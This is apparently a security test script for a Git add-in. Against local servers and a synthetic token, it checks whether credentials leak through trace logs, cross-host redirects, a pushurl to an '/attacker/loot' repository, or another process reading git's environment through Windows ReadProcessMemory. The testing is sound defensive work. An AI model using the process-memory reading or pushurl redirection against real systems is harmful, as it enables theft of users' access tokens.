"""R-21 residual investigation: where can a SYNTHETIC token still go?

Everything is local: HTTPS servers on 127.0.0.1 / localhost with a throwaway
self-signed certificate, no system or global Git config (so no Git
Credential Manager), and a fake token. Prints one line per experiment.

Experiments
  E1  trace: the user's GIT_TRACE_CURL (+ GIT_TRACE_REDACT=0) / GIT_CURL_VERBOSE
  E2  redirect to another host with the repository's http.followRedirects=true
  E3  same host, different repository via the repository's remote.origin.pushurl
  E4  process environment: can another process of the same user read the token?
"""

import base64
import ctypes
import os
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from ctypes import wintypes
from dataclasses import replace

SRC = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "src")
OPENSSL = r"C:\Program Files\Git\usr\bin\openssl.exe"  # ships with Git for Windows; any openssl works
TOKEN = "ghp_SYNTHETIC" + "Z" * 27
B64 = base64.b64encode(f"x-access-token:{TOKEN}".encode()).decode()

base = tempfile.mkdtemp(prefix="ftg_r21_")
empty_global = os.path.join(base, "global.gitconfig")
open(empty_global, "w").close()
os.environ.update({"GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": empty_global, "GIT_SSL_NO_VERIFY": "1"})
sys.path.insert(0, os.path.abspath(SRC))
import fusion_git_core as core  # noqa: E402  (no sibling imports: loads standalone)

cert, key = os.path.join(base, "c.pem"), os.path.join(base, "k.pem")
subprocess.run([OPENSSL, "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", cert,
                "-days", "1", "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1,DNS:localhost"],
               check=True, capture_output=True)


class Server:
    """mode: 'auth' (401 then record), 'redirect:<url>' (302), 'hang' (never answers)."""

    def __init__(self, mode):
        self.mode, self.seen = mode, []
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(20)
        self.port = self.sock.getsockname()[1]
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ctx.load_cert_chain(cert, key)
        threading.Thread(target=self.loop, daemon=True).start()

    def loop(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            threading.Thread(target=self.serve, args=(conn,), daemon=True).start()

    def serve(self, conn):
        try:
            tls = self.ctx.wrap_socket(conn, server_side=True)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = tls.recv(4096)
                if not chunk:
                    return
                data += chunk
            head = data.split(b"\r\n\r\n", 1)[0].decode("latin-1")
            path = head.split(" ")[1]
            auth = next((h.split(":", 1)[1].strip() for h in head.split("\r\n") if h.lower().startswith("authorization:")), "")
            self.seen.append((path, auth))
            if self.mode == "hang":
                time.sleep(60)
                return
            if self.mode.startswith("redirect:"):
                target = self.mode.split(":", 1)[1] + path
                resp = f"HTTP/1.1 302 Found\r\nLocation: {target}\r\nContent-Length: 0\r\n\r\n"
            elif not auth:
                resp = 'HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="x"\r\nContent-Length: 0\r\n\r\n'
            else:
                resp = "HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n"
            tls.sendall(resp.encode())
            tls.close()
        except Exception:
            pass

    def got_token(self):
        return any(B64 in a or TOKEN in a for _, a in self.seen)


def new_repo(name, origin):
    repo = os.path.join(base, name)
    core.git_run(None, "init", "-q", repo)
    core.git_run(repo, "remote", "add", "origin", origin)
    return repo


def auth_for(url):
    return replace(core.token_auth(url, TOKEN), hooks_dir=tempfile.mkdtemp(dir=base))


results = []

# --- E1: tracing set in the user's own environment ------------------------
srv = Server("auth")
url = f"https://127.0.0.1:{srv.port}/acme/designs.git"
repo = new_repo("e1", url)
trace = os.path.join(base, "trace.txt")
for label, extra in (("GIT_TRACE_CURL file, GIT_TRACE_REDACT=0", {"GIT_TRACE_CURL": trace, "GIT_TRACE_REDACT": "0"}),
                     ("GIT_TRACE_CURL file (default redaction)", {"GIT_TRACE_CURL": trace}),
                     ("GIT_CURL_VERBOSE=1 + GIT_TRACE_REDACT=0 (stderr)", {"GIT_CURL_VERBOSE": "1", "GIT_TRACE_REDACT": "0"})):
    if os.path.exists(trace):
        os.remove(trace)
    saved = {k: os.environ.get(k) for k in extra}
    os.environ.update(extra)
    try:
        proc = core.git_run(repo, "ls-remote", "origin", auth=auth_for(url), network=True, check=False)
        err = proc.stderr
        try:
            core.git_run(repo, "ls-remote", "origin", auth=auth_for(url), network=True)
        except core.GitError as exc:
            message = str(exc)
        else:
            message = ""
    finally:
        for k, v in saved.items():
            os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
    in_file = os.path.exists(trace) and (B64 in open(trace, encoding="latin-1").read())
    results.append(f"E1 {label}: server got token={srv.got_token()}, token in trace file={in_file}, "
                   f"base64 token in stderr={B64 in err}, in GitError message={B64 in message}")

# --- E2: redirect to another host -----------------------------------------
other = Server("auth")
redir = Server(f"redirect:https://localhost:{other.port}")
url = f"https://127.0.0.1:{redir.port}/acme/designs.git"
repo = new_repo("e2", url)
core.git_run(repo, "config", "http.followRedirects", "true")
core.git_run(repo, "ls-remote", "origin", auth=auth_for(url), network=True, check=False)
results.append(f"E2 redirect 127.0.0.1 -> localhost with followRedirects=true: other host got token={other.got_token()}, "
               f"other host saw requests={len(other.seen)}")

# --- E3: same host, other repository --------------------------------------
srv3 = Server("auth")
url = f"https://127.0.0.1:{srv3.port}/acme/designs.git"
repo = new_repo("e3", url)
core.git_run(repo, "config", "remote.origin.pushurl", f"https://127.0.0.1:{srv3.port}/attacker/loot.git")
core.git_run(repo, "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgSign=false",
             "commit", "-q", "--allow-empty", "-m", "x")
core.git_run(repo, "push", "origin", "HEAD:refs/heads/x", auth=auth_for(url), network=True, check=False)
loot = [p for p, a in srv3.seen if "attacker/loot" in p and (B64 in a)]
push_url = core.git_run(repo, "remote", "get-url", "--push", "origin").stdout.strip()
results.append(f"E3 pushurl to another repository on the same host (raw git push): token sent for /attacker/loot={bool(loot)}; "
               f"hosts compared: {push_url.split('/')[2]} vs {url.split('/')[2]}")


class _UI:
    def __init__(self):
        self.errors = []

    def info(self, *a): pass
    def warn(self, *a): pass
    def error(self, text): self.errors.append(text)
    def confirm(self, *a): return True


srv3.seen.clear()
export = os.path.join(base, "a.step")
with open(export, "w") as fh:
    fh.write("ISO-10303-21;")
ui = _UI()
result = core.push_export(repo, [(export, "a.step")], "m", "Part", ui, pat_credentials={"token": TOKEN},
                          identity={"name": "t", "email": "t@example.invalid"})
sent = [p for p, a in srv3.seen if B64 in a]
results.append(f"E3 through the add-in's push_export: result={result}, requests carrying the token={sent}, "
               f"refusal shown={bool(ui.errors) and 'stored token' in ui.errors[0]}")

# --- E4: the environment of a running git process -------------------------
if os.name == "nt":
    hang = Server("hang")
    url = f"https://127.0.0.1:{hang.port}/acme/designs.git"
    repo = new_repo("e4", url)
    auth = auth_for(url)
    env = dict(os.environ, **{k: v for k, v in auth.env.items() if v is not None})
    cmd = [core.GIT_EXE] + sum((["-c", c] for c in auth.config), []) + ["ls-remote", "origin"]
    proc = subprocess.Popen(cmd, cwd=repo, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)

    # Read another process's environment block the way any same-user program can.
    k32, ntdll = ctypes.WinDLL("kernel32", use_last_error=True), ctypes.WinDLL("ntdll")

    class PBI(ctypes.Structure):
        _fields_ = [("r1", ctypes.c_void_p), ("Peb", ctypes.c_void_p), ("r2", ctypes.c_void_p * 2),
                    ("Pid", ctypes.c_void_p), ("r3", ctypes.c_void_p)]

    def read(h, addr, size):
        buf = ctypes.create_string_buffer(size)
        n = ctypes.c_size_t()
        k32.ReadProcessMemory(h, ctypes.c_void_p(addr), buf, size, ctypes.byref(n))
        return buf.raw[: n.value]

    def environment_of(pid):
        h = k32.OpenProcess(0x0410, False, pid)  # QUERY_INFORMATION | VM_READ
        if not h:
            return f"OpenProcess failed ({ctypes.get_last_error()})"
        pbi = PBI()
        ntdll.NtQueryInformationProcess(wintypes.HANDLE(h), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
        params = int.from_bytes(read(h, pbi.Peb + 0x20, 8), "little")
        env_ptr = int.from_bytes(read(h, params + 0x80, 8), "little")
        env_size = int.from_bytes(read(h, params + 0x3F0, 8), "little")
        block = read(h, env_ptr, min(env_size or 65536, 1 << 20))
        k32.CloseHandle(h)
        return block.decode("utf-16-le", errors="replace")

    seen_env = environment_of(proc.pid)
    results.append(f"E4 another process of the same user read git's environment: token visible={TOKEN in seen_env}")
    proc.kill()
    proc.wait()
else:
    results.append("E4 skipped (Windows-only reader in this probe)")

for line in results:
    print(line)
shutil.rmtree(base, ignore_errors=True)
